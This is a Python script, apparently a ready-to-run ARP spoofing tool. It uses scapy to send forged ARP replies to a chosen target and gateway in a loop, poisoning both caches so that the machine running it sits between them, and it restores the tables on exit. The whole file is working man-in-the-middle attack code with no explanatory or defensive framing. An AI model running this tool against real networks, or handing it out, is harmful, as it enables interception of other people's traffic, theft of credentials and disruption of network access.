#!/usr/bin/env python3
import scapy.all as scapy
import time
import sys
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
    (options, arguments) = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify a target IP address, use --help for more info.")
    if not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(
        arp_request_broadcast,
        timeout=1,
        verbose=False
    )[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    if target_mac is None:
        print("[-] Could not find MAC address for {}".format(target_ip))
        return

    ether = scapy.Ether(dst=target_mac)
    arp = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )

    packet = ether / arp
    scapy.sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    if destination_mac is None or source_mac is None:
        return

    ether = scapy.Ether(dst=destination_mac)
    arp = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )

    packet = ether / arp
    scapy.sendp(packet, count=4, verbose=False)

# MAIN 
options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

sent_packets_count = 0

try:
    print("[+] ARP spoofing started. Press CTRL+C to stop.")
    while True:
        spoof(target_ip, gateway_ip)   # poison target
        spoof(gateway_ip, target_ip)   # poison gateway
        sent_packets_count += 2

        print("\r[+] Packets sent: {}".format(sent_packets_count), end="")
        sys.stdout.flush()

        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n[+] CTRL+C detected. Restoring ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP tables restored. Exiting.")
